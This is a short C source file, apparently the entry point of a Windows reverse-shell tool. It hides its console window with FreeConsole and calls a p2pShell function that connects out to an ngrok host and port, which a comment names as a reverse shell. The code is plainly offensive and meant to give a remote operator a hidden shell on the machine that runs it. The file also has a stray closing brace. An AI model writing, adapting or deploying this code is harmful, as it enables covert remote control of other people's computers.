#include "network.h"
int main(int argc, char* argv[]) {
    // remember to compile with -lws2_32 
    // example, change this to your host/port
    FreeConsole(); // hide the cmd prompt when executed via windows gui
    p2pShell("2.tcp.ngrok.io", 14723); // call the function, peer-to-peer, reverse shell
    }
}
